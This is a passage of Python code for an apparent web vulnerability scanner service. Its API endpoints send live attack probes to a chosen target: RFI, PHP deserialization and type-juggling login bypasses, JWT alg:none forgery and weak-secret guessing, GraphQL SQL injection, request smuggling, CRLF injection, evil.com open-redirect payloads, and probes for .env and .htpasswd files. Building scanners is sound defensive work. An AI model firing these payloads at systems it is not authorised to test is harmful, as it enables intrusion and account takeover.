    return {"scan_id":scan_id,"target":req.target,"tool":"subdomains","subdomains":subdomains,"total":len(subdomains),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/dns")
async def scan_dns(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    host = _recon_host(req.target)
    loop = asyncio.get_event_loop()
    recs = await loop.run_in_executor(None, _dns_enum_records, host)
    records = {}
    for r in recs: records.setdefault(r["type"],[]).append(r["value"])
    out = "\n".join(f"{r['type']} {r['value']}" for r in recs)
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"dns",req.target,{"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"dns","records":records,"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/ffuf")
async def scan_ffuf(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    items = await _python_fuzz(req.target, custom_paths=req.wordlist, extra_headers=_make_req_headers(req) if (req.auth_cookie or req.auth_bearer) else None)
    discovered = [item["path"] for item in items]
    out = "\n".join(f"[{item['status']}] {item['path']} [{item['size']} bytes]" for item in items)
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"ffuf",req.target,{"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"ffuf","discovered":discovered,"total":len(discovered),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/rfi")
async def scan_rfi(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; vulnerable = False
    skipped_reason = None
    target_url = _web_url(req.target)

    # Skip on static-only hosts — RFI is impossible without server-side code execution
    static_host = _detect_static_host(target_url)
    if static_host:
        skipped_reason = f"Target is hosted on {static_host} (static-only — RFI not possible)"
    else:
        # Use a non-existent test URL that should never appear in a normal page
        # (using example.com which is reserved per RFC 2606 and won't be reflected by SPAs as content)
        marker = "vulnuslab-rfi-canary-marker-xyz789"
        # The payload tries to make the server FETCH and INCLUDE a remote file.
        # If the server actually does this, the response will contain content from the included URL.
        # We use httpbin.org/uuid which returns a unique JSON each time — we check if that content
        # appears in the response body (proves server-side fetch happened, not just URL reflection).
        for param in ["page", "file", "include", "url", "template"]:
            payload_q = f"{param}=https://httpbin.org/uuid"
            r_base, r_payload = _baseline_then_payload(target_url, payload_q, timeout=10)
            if not r_payload: continue
            # Server-side include happened only if:
            # 1. Response is meaningfully different from baseline (not same SPA index.html)
            # 2. Response contains the httpbin uuid JSON structure (proves remote fetch)
            if (_response_meaningfully_different(r_base, r_payload, threshold=20)
                    and '"uuid"' in r_payload.text
                    and (not r_base or '"uuid"' not in r_base.text)):
                findings.append({"detail": f"Remote File Inclusion via parameter '{param}' — server fetched and included content from external URL", "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A", "cwe": "CWE-98", "cwe_name": "Remote File Inclusion", "owasp": "A03:2021", "remediation": "Disable allow_url_include in PHP. Validate all file path inputs against an allowlist."})
                vulnerable = True; break

    scan_id = str(uuid.uuid4()); save_scan(scan_id, "rfi", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "rfi", "vulnerable": vulnerable, "findings": findings, "skipped_reason": skipped_reason, "total": len(findings), "timestamp": datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/deserial")
async def scan_deserial(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    import base64 as _b64
    findings = []; vulnerable = False
    skipped_reason = None
    base = _web_url(req.target).rstrip("/")

    # Skip dynamic-execution checks on static-only hosts (Netlify/Cloudflare Pages/Vercel/etc.)
    static_host = _detect_static_host(base)
    if static_host:
        skipped_reason = f"Target is hosted on {static_host} (static-only — deserialization RCE not possible)"
        scan_id = str(uuid.uuid4()); save_scan(scan_id,"deserial",req.target,{"output":str(findings)})
        return {"scan_id":scan_id,"target":req.target,"tool":"deserial","vulnerable":False,"findings":findings,"skipped_reason":skipped_reason,"total":0,"timestamp":datetime.datetime.utcnow().isoformat()}

    # Detect server tech so we can skip language-specific probes that don't apply.
    # E.g. don't run PHP unserialize probe against a Node.js or .NET app — guaranteed false positive.
    is_php = False
    try:
        tech_resp = _req_lib.get(base, timeout=8, verify=False, headers=_BROWSER_HEADERS, allow_redirects=True)
        srv_hdr = (tech_resp.headers.get("Server","") + " " + tech_resp.headers.get("X-Powered-By","")).lower()
        is_php = ("php" in srv_hdr) or any(p in tech_resp.text.lower() for p in [".php", "phpsessid", "<?php"])
    except Exception:
        pass

    r = _http_get(base, timeout=10)
    if r:
        body = r.text; all_cookies = " ".join(r.headers.get("Set-Cookie","").split())
        ct = r.headers.get("Content-Type","").lower()
        # Java: magic bytes aced0005 appear as rO0A in base64 in cookies/body
        if "rO0AB" in body or "rO0AB" in all_cookies:
            vulnerable = True
            findings.append({"detail":"Java serialized object detected (base64 magic rO0AB = 0xACED0005) in response — likely passed to ObjectInputStream","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-502","cwe_name":"Insecure Deserialization","owasp":"A08:2021","remediation":"Never deserialize untrusted data. Use allowlists. Upgrade to safer formats (JSON/Protobuf)."})
        if "application/x-java-serialized-object" in ct:
            vulnerable = True
            findings.append({"detail":"Server returns Java serialized object Content-Type — endpoint accepts/returns Java objects directly","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-502","cwe_name":"Insecure Deserialization","owasp":"A08:2021","remediation":"Replace Java serialization with JSON. Apply SerialKiller or notSerializable checks."})
        # PHP: O:N: pattern in cookies or body (PHP serialized object)
        if re.search(r'O:\d+:"[A-Za-z]', body) or re.search(r'O:\d+:"[A-Za-z]', all_cookies):
            vulnerable = True
            findings.append({"detail":"PHP serialized object pattern O:N:\"ClassName\" detected — server may pass this to unserialize()","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-502","cwe_name":"PHP Object Injection","owasp":"A08:2021","remediation":"Never call unserialize() on user-controlled data. Use json_decode() instead."})
        # .NET: ViewState without MAC validation
        vs_match = re.search(r'__VIEWSTATE[^>]*value="([^"]{20,})"', body)
        if vs_match:
            vs = vs_match.group(1)
            if not re.search(r'__VIEWSTATEGENERATOR', body) or "EnableViewStateMac" in body:
                findings.append({"detail":"ASP.NET ViewState found — if MAC validation is disabled this allows deserialization RCE","severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-502","cwe_name":".NET ViewState Deserialization","owasp":"A08:2021","remediation":"Enable viewStateEncryptionMode=Always and machineKey validation. Use .NET 4.5.2+ with EnableViewStateMac=true."})
        # Node.js: node-serialize / serialize-javascript patterns
        if re.search(r'_\$\$ND_FUNC\$\$_|{"rce":', body):
            vulnerable = True
            findings.append({"detail":"Node.js deserialization payload marker detected — possible node-serialize RCE vector","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-502","cwe_name":"Node.js Deserialization RCE","owasp":"A08:2021","remediation":"Replace node-serialize with JSON.parse(). Never eval() deserialized function strings."})

        # PHP unserialize active probe — ONLY run on PHP apps to avoid false positives on Node.js/Java/.NET
        # Many SPAs (Angular, React) serve a static index.html for every request containing words like
        # "uid" or "root" in the JS bundle — naive text matching gives critical-level false positives.
        if is_php:
            php_probe = 'O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}'
            try:
                # Get baseline (no probe) AND payload response, compare them
                r_base = _req_lib.post(base, data={"data": ""}, timeout=8, verify=False, headers=_BROWSER_HEADERS)
                rp = _req_lib.post(base, data={"data": php_probe}, timeout=8, verify=False, headers=_BROWSER_HEADERS)
                # Require: uid= present in PROBE response, NOT in BASELINE, AND response meaningfully different
                payload_has = rp and ("uid=" in rp.text or re.search(r"\broot\b", rp.text))
                baseline_has = r_base and ("uid=" in r_base.text or re.search(r"\broot\b", r_base.text))
                if payload_has and not baseline_has and _response_meaningfully_different(r_base, rp, threshold=30):
                    vulnerable = True
                    findings.append({"detail":"PHP unserialize RCE confirmed — POST data with serialized object triggered command execution (uid/root appeared only after probe)","severity":"CRITICAL","cvss":"10.0","cve":"N/A","cwe":"CWE-502","cwe_name":"PHP Object Injection RCE","owasp":"A08:2021","remediation":"Remove unserialize() from all user-controlled input paths immediately."})
            except Exception:
                pass

    scan_id = str(uuid.uuid4()); save_scan(scan_id,"deserial",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"deserial","vulnerable":vulnerable,"findings":findings,"skipped_reason":skipped_reason,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/protopollution")
async def scan_protopollution(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; vulnerable = False
    base = _web_url(req.target).rstrip("/")
    marker = f"pptest{uuid.uuid4().hex[:6]}"
    # Test 1: GET params with prototype pollution payloads
    proto_params = [
        f"__proto__[{marker}]={marker}",
        f"constructor[prototype][{marker}]={marker}",
        f"__proto__.{marker}={marker}",
    ]
    for param in proto_params:
        try:
            r = _req_lib.get(f"{base}?{param}", timeout=8, verify=False, headers=_BROWSER_HEADERS)
            if r and marker in r.text:
                vulnerable = True
                findings.append({"detail":f"Prototype Pollution via GET: ?{param[:60]} — marker '{marker}' reflected in response, server may merge params into object prototype","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-1321","cwe_name":"Prototype Pollution","owasp":"A03:2021","remediation":"Use Object.create(null) for config objects. Sanitize keys — block __proto__, constructor, prototype. Use frozen objects."})
                break
        except: pass
    # Test 2: JSON POST body with prototype pollution
    if not vulnerable:
        pp_payloads = [
            {"__proto__": {marker: marker}},
            {"constructor": {"prototype": {marker: marker}}},
        ]
        for payload in pp_payloads:
            try:
                r = _req_lib.post(base, json=payload, timeout=8, verify=False,
                                  headers={**_BROWSER_HEADERS, "Content-Type": "application/json"})
                if r and marker in r.text:
                    vulnerable = True
                    findings.append({"detail":f"Prototype Pollution via JSON POST — {list(payload.keys())[0]} key reflected/processed, possible prototype chain corruption","severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-1321","cwe_name":"Prototype Pollution","owasp":"A03:2021","remediation":"Validate and sanitize all JSON keys. Use schema validation (Joi/Ajv). Block __proto__ and constructor keys."})
                    break
            except: pass
    # Test 3: Check if app uses vulnerable merge libraries (client-side indicators)
    r0 = _http_get(base, timeout=8)
    if r0:
        vuln_libs = [("lodash", "CVE-2019-10744"), ("jquery", "CVE-2019-11358"), ("merge", "prototype pollution")]
        for lib, cve in vuln_libs:
            if lib in r0.text.lower() and not vulnerable:
                findings.append({"detail":f"JavaScript library '{lib}' detected — known prototype pollution vector ({cve}). Verify version is patched.","severity":"MEDIUM","cvss":"6.5","cve":cve,"cwe":"CWE-1321","cwe_name":"Prototype Pollution","owasp":"A06:2021","remediation":f"Update {lib} to latest patched version. Apply Content-Security-Policy."})
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"protopollution",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"protopollution","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/typejuggling")
async def scan_typejuggling(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; vulnerable = False
    base = _web_url(req.target).rstrip("/")
    # PHP magic hashes — these strings == 0 in loose comparison (==) with 0 or other magic hashes
    magic_hashes = ["240610708","QNKCDZO","0e215022452","aabg74hk2","0e830400451993494058024219903391"]
    login_paths = ["/login","/login.php","/admin/login","/wp-login.php","/index.php","/signin"]
    for path in login_paths:
        url = base + path
        r0 = _http_get(url, timeout=6)
        if not r0 or r0.status_code not in (200, 302): continue
        # Test 1: JSON type confusion — send boolean true as password
        for uname in ["admin","administrator","user"]:
            try:
                rj = _req_lib.post(url, json={"username": uname, "password": True},
                                   timeout=8, verify=False,
                                   headers={**_BROWSER_HEADERS, "Content-Type":"application/json"})
                if rj and rj.status_code in (200,302) and any(x in rj.text.lower() for x in ["dashboard","welcome","logout","profile"]):
                    vulnerable = True
                    findings.append({"detail":f"PHP Type Juggling: POST {path} with password=true (boolean) bypassed authentication for user '{uname}' — server uses loose comparison","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-843","cwe_name":"PHP Type Juggling","owasp":"A07:2021","remediation":"Use strict comparison (===) everywhere. Use password_verify(). Never compare passwords with == or in_array with loose types."})
                    break
            except: pass
        if vulnerable: break
        # Test 2: magic hash string as password
        for magic in magic_hashes[:3]:
            try:
                rm = _req_lib.post(url, data={"username":"admin","password":magic},
                                   timeout=8, verify=False, headers=_BROWSER_HEADERS)
                if rm and rm.status_code in (200,302) and any(x in rm.text.lower() for x in ["dashboard","welcome","logout","profile"]):
                    vulnerable = True
                    findings.append({"detail":f"PHP Type Juggling: magic hash '{magic}' accepted as password at {path} — server compares hashes with == (0e... == 0e...)","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-843","cwe_name":"PHP Magic Hash Type Juggling","owasp":"A07:2021","remediation":"Use === for hash comparison. Use password_hash() and password_verify(). Never use md5/sha1 for passwords."})
                    break
            except: pass
        if vulnerable: break
        # Test 3: array bypass — password[]=anything
        try:
            ra = _req_lib.post(url, data={"username":"admin","password[]":"x"},
                               timeout=8, verify=False, headers=_BROWSER_HEADERS)
            if ra and ra.status_code in (200,302) and any(x in ra.text.lower() for x in ["dashboard","welcome","logout"]):
                vulnerable = True
                findings.append({"detail":f"PHP Type Juggling: array bypass at {path} — sending password[] as array bypassed string comparison","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-843","cwe_name":"PHP Array Type Confusion","owasp":"A07:2021","remediation":"Validate that password input is a string, not an array. Use is_string() check before comparison."})
        except: pass
        if vulnerable: break
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"typejuggling",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"typejuggling","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/jwt")
async def scan_jwt(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    import base64 as _b64, hmac as _hmac, hashlib as _hashlib, json as _json
    findings = []; vulnerable = False
    base = _web_url(req.target).rstrip("/")
    # Step 1: find JWT tokens in response headers / cookies / body
    r = _http_get(base, timeout=10)
    jwt_tokens = []
    if r:
        # Look in Authorization header hints, cookies, and body
        combined = r.text + " " + str(r.headers) + " " + r.headers.get("Set-Cookie","")
        jwt_pattern = re.findall(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', combined)
        jwt_tokens = list(set(jwt_pattern))
    # Also try login to get a token
    for lpath in ["/api/login","/login","/api/auth/login","/api/auth","/api/token"]:
        try:
            lr = _req_lib.post(base+lpath, json={"username":"test","password":"test"},
                               timeout=6, verify=False,
                               headers={**_BROWSER_HEADERS,"Content-Type":"application/json"})
            if lr:
                found = re.findall(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', lr.text)
                jwt_tokens.extend(found)
        except: pass
    jwt_tokens = list(set(jwt_tokens))[:3]
    def _b64pad(s):
        return s + "=" * (-len(s) % 4)
    for token in jwt_tokens:
        parts = token.split(".")
        if len(parts) != 3: continue
        try:
            header = _json.loads(_b64.b64decode(_b64pad(parts[0])).decode())
            payload_data = _json.loads(_b64.b64decode(_b64pad(parts[1])).decode())
            alg = header.get("alg","")
            # Check 1: alg:none attack
            none_header = _b64.urlsafe_b64encode(_json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
            none_token = f"{none_header}.{parts[1]}."
            try:
                rn = _http_get(base, timeout=8)
                # Send none token as Authorization Bearer
                rn2 = _req_lib.get(base+"/api/profile", timeout=8, verify=False,
                                   headers={**_BROWSER_HEADERS,"Authorization":f"Bearer {none_token}"})
                if rn2 and rn2.status_code == 200 and len(rn2.text) > 50:
                    vulnerable = True
                    findings.append({"detail":f"JWT alg:none attack successful — server accepted unsigned token without signature verification","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-347","cwe_name":"JWT Algorithm Confusion","owasp":"A02:2021","remediation":"Explicitly validate JWT algorithm. Reject alg:none. Use asymmetric keys (RS256) instead of HS256."})
            except: pass
            # Check 2: weak secret brute force
            weak_secrets = ["secret","password","123456","admin","key","jwt","token","supersecret",
                           "your-256-bit-secret","change_this","mysecret","s3cr3t","pass"]
            if alg.startswith("HS"):
                msg = f"{parts[0]}.{parts[1]}".encode()
                for secret in weak_secrets:
                    expected_sig = _b64.urlsafe_b64encode(
                        _hmac.new(secret.encode(), msg, _hashlib.sha256).digest()
                    ).rstrip(b"=").decode()
                    if expected_sig == parts[2]:
                        vulnerable = True
                        findings.append({"detail":f"JWT signed with weak secret '{secret}' — attacker can forge any token (admin, role escalation)","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-347","cwe_name":"Weak JWT Secret","owasp":"A02:2021","remediation":"Use cryptographically random 256-bit secret. Rotate secrets regularly. Consider RS256 asymmetric signing."})
                        break
            # Check 3: sensitive data in payload
            sensitive_keys = ["password","passwd","secret","credit","ssn","dob","email","phone"]
            for k in sensitive_keys:
                if k in str(payload_data).lower():
                    findings.append({"detail":f"Sensitive data in JWT payload: key '{k}' found — JWT is base64, NOT encrypted, visible to anyone","severity":"MEDIUM","cvss":"5.3","cve":"N/A","cwe":"CWE-312","cwe_name":"Sensitive Data in JWT","owasp":"A02:2021","remediation":"Never store sensitive data in JWT payload. Use opaque session tokens for sensitive data. Use JWE for encryption."})
            # Check 4: no expiry
            if "exp" not in payload_data:
                findings.append({"detail":"JWT has no expiry (exp claim missing) — token is valid forever, cannot be invalidated","severity":"MEDIUM","cvss":"6.5","cve":"N/A","cwe":"CWE-613","cwe_name":"Insufficient Session Expiration","owasp":"A07:2021","remediation":"Always set exp claim. Use short-lived tokens (15 min). Implement token refresh flow."})
        except: pass
    if not jwt_tokens:
        findings.append({"detail":"No JWT tokens detected in responses — site may not use JWT authentication","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"N/A","owasp":"N/A","remediation":"N/A"})
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"jwt",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"jwt","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/graphql")
async def scan_graphql(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; vulnerable = False
    base = _web_url(req.target).rstrip("/")
    gql_paths = ["/graphql","/api/graphql","/graphiql","/playground","/gql","/query",
                 "/api/query","/v1/graphql","/v2/graphql","/graphql/v1"]
    introspection_query = '{"query":"{__schema{types{name fields{name}}}}"}'
    found_endpoint = None
    for path in gql_paths:
        try:
            r = _req_lib.post(base+path, data=introspection_query, timeout=8, verify=False,
                              headers={**_BROWSER_HEADERS,"Content-Type":"application/json"})
            if r and r.status_code == 200 and "__schema" in r.text:
                found_endpoint = path
                vulnerable = True
                # Extract type names from introspection
                type_names = re.findall(r'"name"\s*:\s*"([A-Za-z][A-Za-z0-9_]+)"', r.text)
                sensitive_types = [t for t in type_names if any(x in t.lower() for x in ["user","admin","password","secret","token","auth","credit","payment"])]
                findings.append({"detail":f"GraphQL introspection enabled at {path} — full schema exposed ({len(type_names)} types). Sensitive types: {sensitive_types[:5] or 'none detected'}","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-200","cwe_name":"GraphQL Introspection Enabled","owasp":"A05:2021","remediation":"Disable introspection in production. Use query depth limiting and complexity analysis."})
                break
            elif r and r.status_code == 200 and "data" in r.text:
                found_endpoint = path
                findings.append({"detail":f"GraphQL endpoint found at {path} (introspection blocked but endpoint active)","severity":"MEDIUM","cvss":"5.3","cve":"N/A","cwe":"CWE-200","cwe_name":"GraphQL Endpoint Exposed","owasp":"A05:2021","remediation":"Implement authentication on GraphQL endpoint. Use persisted queries only."})
                break
        except: pass
    if found_endpoint:
        # Test for SQL/NoSQL injection via GraphQL
        inject_query = '{"query":"{ user(id: \\"1 OR 1=1\\") { id name email } }"}'
        try:
            ri = _req_lib.post(base+found_endpoint, data=inject_query, timeout=8, verify=False,
                               headers={**_BROWSER_HEADERS,"Content-Type":"application/json"})
            if ri and ri.status_code == 200:
                if re.search(r'"email"\s*:\s*"[^@]+@[^"]+"|"password"', ri.text):
                    vulnerable = True
                    findings.append({"detail":"GraphQL injection: SQL/NoSQL injection via GraphQL argument returned user data — possible data exfiltration","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-89","cwe_name":"GraphQL Injection","owasp":"A03:2021","remediation":"Use parameterized resolvers. Validate and sanitize all GraphQL arguments. Use ORM with prepared statements."})
        except: pass
        # Test for batching attack (DoS / auth bypass via alias batching)
        batch_query = '{"query":"{ a:__typename b:__typename c:__typename d:__typename e:__typename }"}'
        try:
            rb = _req_lib.post(base+found_endpoint, data=batch_query, timeout=8, verify=False,
                               headers={**_BROWSER_HEADERS,"Content-Type":"application/json"})
            if rb and '"a"' in rb.text and '"b"' in rb.text:
                findings.append({"detail":"GraphQL query batching allowed — attacker can bypass rate limiting by batching auth attempts in a single request","severity":"MEDIUM","cvss":"6.5","cve":"N/A","cwe":"CWE-307","cwe_name":"GraphQL Batching Attack","owasp":"A04:2021","remediation":"Limit query complexity and depth. Implement per-query rate limiting. Disable batching or limit batch size to 1."})
        except: pass
    else:
        findings.append({"detail":"No GraphQL endpoint detected at common paths — site may not use GraphQL","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"N/A","owasp":"N/A","remediation":"N/A"})
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"graphql",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"graphql","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/smuggling")
async def scan_smuggling(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []
    # Send TE.CL ambiguous request and look for server confusion (501/400 NOT present = server accepts both headers)
    # Also check if server responds with different status when TE conflicts
    result1 = await run_tool(["curl","-s","-I","--http1.1","-H","Transfer-Encoding: chunked","-H","Content-Length: 6","--max-time","8",req.target], timeout=15)
    result2 = await run_tool(["curl","-s","-I","--http1.1","--max-time","8",req.target], timeout=15)
    out1 = result1.get("output",""); out2 = result2.get("output","")
    def _status(out): m=re.search(r"HTTP/[\d.]+ (\d+)",out); return m.group(1) if m else "0"
    s1,s2 = _status(out1), _status(out2)
    # Only report if the ambiguous request causes a materially different response (e.g. 200 vs 400/500)
    if s1 and s2 and s1!=s2 and s1 not in ("0","") and s2 not in ("0",""):
        if (s1.startswith("4") or s1.startswith("5")) and s2=="200":
            findings.append({"detail":f"HTTP Request Smuggling: server responds differently to TE+CL conflict ({s2} normal vs {s1} with conflicting headers)","severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-444","cwe_name":"HTTP Request Smuggling","owasp":"A02:2021","remediation":"Enforce HTTP/2 end-to-end. Configure server to reject requests with both Transfer-Encoding and Content-Length headers."})
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"smuggling",req.target,{"output":out1})
    return {"scan_id":scan_id,"target":req.target,"tool":"smuggling","vulnerable":bool(findings),"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/responsesplitting")
async def scan_responsesplitting(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; vulnerable = False
    test = req.target + "?q=%0d%0aSet-Cookie:injected=1"
    r = _http_get(test, timeout=10)
    if r and "injected" in str(r.headers):
        vulnerable = True
        findings.append({"detail":"HTTP Response Splitting via CRLF injection","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-113","cwe_name":"HTTP Response Splitting","owasp":"A03:2021","remediation":"Strip CR/LF from all user-controlled values used in headers."})
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"responsesplitting",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"responsesplitting","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/sessionfixation")
async def scan_sessionfixation(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; vulnerable = False
    r = _http_get(req.target, timeout=10)
    if r:
        sc = r.headers.get("Set-Cookie","")
        if "httponly" not in sc.lower():
            findings.append({"detail":"Session cookie missing HttpOnly flag","severity":"MEDIUM","cvss":"5.4","cve":"N/A","cwe":"CWE-384","cwe_name":"Session Fixation","owasp":"A07:2021","remediation":"Set HttpOnly and Secure flags on all session cookies."})
            vulnerable = True
        if "samesite" not in sc.lower():
            findings.append({"detail":"Session cookie missing SameSite attribute","severity":"LOW","cvss":"3.5","cve":"N/A","cwe":"CWE-384","cwe_name":"Session Fixation","owasp":"A07:2021","remediation":"Add SameSite=Strict or SameSite=Lax to session cookies."})
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"sessionfixation",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"sessionfixation","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/openredirect")
async def scan_openredirect(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; vulnerable = False
    payloads = ["?url=https://evil.com","?redirect=https://evil.com","?next=https://evil.com","?return=https://evil.com","?to=https://evil.com"]
    for p in payloads:
        try:
            r = _req_lib.get(_web_url(req.target)+p,timeout=10,verify=False,headers=_BROWSER_HEADERS,allow_redirects=False)
            loc = r.headers.get("Location","").strip()
            # Must redirect TO evil.com, not just echo it as a query parameter
            if loc.startswith("https://evil.com") or loc.startswith("http://evil.com") or loc.startswith("//evil.com"):
                vulnerable = True
                findings.append({"detail":f"Open Redirect via {p} → {loc} (server redirects directly to attacker domain)","severity":"MEDIUM","cvss":"6.1","cve":"N/A","cwe":"CWE-601","cwe_name":"Open Redirect","owasp":"A01:2021","remediation":"Whitelist allowed redirect destinations. Never redirect to user-supplied URLs."})
                break
        except: pass
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"openredirect",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"openredirect","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/sensitivefiles")
async def scan_sensitivefiles(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; base = req.target.rstrip("/")
    is_spa = _detect_spa(req.target)
    baseline_size = None
    try:
        br = _http_get(base + "/", timeout=6)
        if br and br.status_code == 200: baseline_size = len(br.content)
    except: pass
    paths = [
        ".env","config.php","wp-config.php",".git/HEAD","backup.zip","db.sql",
        "admin/","phpinfo.php",".htpasswd","web.config","server-status",
        "robots.txt","sitemap.xml",".well-known/security.txt",
        "crossdomain.xml","test.php","info.php","debug.php","status","healthz",
        "dvwa/","dvwa/login.php","setup.php","instructions.php","dvwa/phpinfo.php",
        "WebGoat/","WebGoat/login","WebGoat/registration",
        "mutillidae/","mutillidae/index.php","mutillidae/set-up-database.php",
        "bWAPP/","bWAPP/login.php","bWAPP/install.php","bWAPP/admin/",
        "config/database.php","includes/config.php",".DS_Store",".svn/entries",
        "ftp/","backup/","old/","temp/","tmp/",
    ]
    high_risk = [".env","config.php","wp-config",".git","backup","db.sql",".htpasswd","web.config","install.php","set-up-database","database.php","phpinfo"]
    for p in paths:
        r = _http_get(f"{base}/{p.lstrip('/')}", timeout=6)
        if not r: continue
        if r.status_code == 403:
            # 403 = access denied = resource exists — always a real finding
            sev = "HIGH" if any(x in p for x in high_risk) else "MEDIUM"
            findings.append({"detail":f"/{p} exists but access is denied (HTTP 403) — resource is present on server","severity":sev,"cvss":"5.3","cve":"N/A","cwe":"CWE-538","cwe_name":"Sensitive File Exposure","owasp":"A05:2021","remediation":f"Remove /{p} from the web root entirely."})
        elif r.status_code == 200:
            ct = r.headers.get("Content-Type","").lower()
            # Skip if response size matches homepage baseline (SPA returning index.html for unknown paths)
            if baseline_size and len(r.content) == baseline_size and "text/html" in ct: continue
            # Skip if SPA returned its own HTML index page for this path
            if is_spa and "text/html" in ct: continue
            # Skip if the response is just a redirect/login page (very short HTML)
            if "text/html" in ct and len(r.text) < 200 and p not in ("robots.txt","sitemap.xml"): continue
            sev = "HIGH" if any(x in p for x in high_risk) else "LOW"
            findings.append({"detail":f"Accessible: /{p} (HTTP 200, {len(r.content)} bytes) — {'sensitive file/configuration exposed' if sev=='HIGH' else 'file or directory is publicly accessible'}","severity":sev,"cvss":"7.5" if sev=="HIGH" else "3.1","cve":"N/A","cwe":"CWE-538","cwe_name":"Sensitive File Exposure","owasp":"A05:2021","remediation":f"Block public access to /{p}. Remove install/setup/backup files after deployment."})
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"sensitivefiles",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"sensitivefiles","vulnerable":bool(findings),"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/hydra")
async def scan_hydra(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; vulnerable = False
    if _is_external(req.target):
